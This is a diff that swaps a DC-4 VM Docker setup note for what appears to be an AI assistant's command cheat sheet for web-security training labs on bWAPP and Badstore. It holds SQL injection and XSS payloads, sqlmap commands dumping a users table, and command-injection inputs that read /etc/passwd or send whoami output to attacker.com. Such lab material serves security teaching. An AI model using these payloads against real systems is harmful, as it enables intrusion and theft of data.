@@ -1,32 +1,180 @@
-sudo apt install -y qemu-system-x86 wget
-sudo apt install docker.io -y
-sudo apt install -y docker.io qemu-system-x86\n
-sudo systemctl start docker
-sudo systemctl status docker
+Here are the **pure command/code lines only** (no text explanations) from the labs in your `was.pdf`, organized for quick use:
 
-tar -xvf DC-4.ova
-qemu-img convert -f vmdk -O raw DC-4.vmdk dc4.raw
- mkdir dc4-docker && cd dc4-docker
-qemu-img convert -O raw DC4-disk001.vmdk dc4.img**
+---
 
-sudo qemu-img convert -f raw -O qcow2 dc4.img dc4.qcow2**
-mv ../dc4.raw
+### ✅ **LAB 4 – Badstore Docker**
 
-**FROM ubuntu:latest**
+```bash
+docker pull jvhoof/badstore-docker
+docker run -d -p 80:80 jvhoof/badstore-docker
+```
 
-**RUN apt update && apt install -y qemu-system-x86**
+---
 
-**COPY dc4.qcow2 /dc4.qcow2**
+### ✅ **LAB 6 – bWAPP Docker**
 
-**EXPOSE 80**
+```bash
+docker pull hackersploit/bwapp-docker
+docker run -d -p 80:80 hackersploit/bwapp-docker
+```
 
-**CMD ["qemu-system-x86_64", "-m", "2048", "-hda", "/dc4.qcow2", "-net", "nic", "-net", "user,hostfwd=tcp::80-:80", "-nographic"]**
+**Install in browser:**
 
- docker build -t dc4-container .
-sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' dc4-container
+```
+http://127.0.0.1/install.php
+```
 
+---
 
+### ✅ **LAB 7 – bWAPP Login**
 
+```
+Username: bee
+Password: bug
+```
 
+---
 
- Create Your Dockerfile with Vulnerable App
+### ✅ **LAB 10–13 – bWAPP Manual Installation**
+
+```bash
+sudo apt-get update -y
+cd ~/Downloads
+mkdir bwapp
+ls
+mv bWAPPv2.2.zip bwapp
+cd bwapp
+unzip bWAPPv2.2.zip
+rm bWAPPv2.2.zip
+mysql -V
+sudo apt install mysql-server
+sudo systemctl start mysql
+sudo systemctl enable mysql
+sudo systemctl status mysql
+apache2 -v
+sudo apt install apache2
+sudo systemctl start apache2
+sudo systemctl enable apache2
+sudo systemctl status apache2
+cd BWA*/  # Adjust directory name if needed
+chmod 777 passwords/
+chmod 777 images/
+chmod 777 documents/
+sudo mysql
+CREATE USER 'ahmed'@'localhost' IDENTIFIED BY 'pass123';
+GRANT ALL PRIVILEGES ON bWAPP.* TO 'ahmed'@'localhost';
+FLUSH PRIVILEGES;
+exit
+mousepad admin/settings.php
+# Edit inside:
+# $db_username = "ahmed";
+# $db_password = "pass123";
+mousepad install.php
+# Replace content with copied install code
+cd ../
+sudo mv * /var/www/html/
+```
+
+**Finish installation in browser:**
+
+```
+http://localhost/bWAPP/install.php
+```
+
+```bash
+sudo mysql
+SHOW DATABASES;
+exit
+```
+
+**Login:**
+
+```
+http://localhost/bWAPP/
+Username: bee
+Password: bug
+```
+
+---
+
+### ✅ **LAB 17 – SQLi Payloads**
+
+```sql
+' OR '1'='1 --
+' OR 1=1 --
+admin' --
+' OR 'a'='a
+1' AND extractvalue(1, concat(0x7e, version())) --
+1' AND updatexml(null, concat(0x3a, database()), null) --
+' UNION SELECT null, version(), user() --
+' UNION SELECT 1, database(), 3 --
+' OR IF(1=1, SLEEP(5), 0) --
+' AND SLEEP(5) --
+```
+
+---
+
+### ✅ **LAB 18 – Command Injection**
+
+```
+127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | uname -a
+127.0.0.1; cat /etc/passwd
+127.0.0.1 && curl http://attacker.com?`whoami`
+127.0.0.1 | sleep 5 | ls
+127.0.0.1 && ping -c 5 127.0.0.1
+127.0.0.1 || sleep 10
+```
+
+---
+
+### ✅ **LAB 19 – XSS Payloads**
+
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+<a href="javascript:alert(1)">Click me</a>
+<input onmouseover="alert('XSS')" autofocus>
+<body onload=alert('XSS')>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg/onload=alert('XSS')>
+```
+
+---
+
+### ✅ **LAB 20–21 – SQLMap Commands**
+
+```bash
+sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" --cookie="PHPSESSID=your-session-id" --batch --random-agent
+
+sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
+--cookie="PHPSESSID=your-session-id" \
+--level=5 --risk=3 --batch --random-agent
+
+sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
+--cookie="PHPSESSID=your-session-id" \
+--batch --random-agent --dbs
+
+sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
+--cookie="PHPSESSID=your-session-id" \
+--batch --random-agent -D bwapp --tables
+
+sqlmap -u "http://localhost:8080/sqli_1.php?title=abc" \
+--cookie="PHPSESSID=your-session-id" \
+--batch --random-agent -D bwapp -T users --dump
+```
+
+**Using request file from Burp Suite:**
+
+```bash
+sqlmap -r request.txt --batch --random-agent
+```
+
+---
+
+Let me know if you want:
+
+* A script to run all of this at once
+* Dockerfile to build your own vulnerable app image
+* Additional payloads or attacks
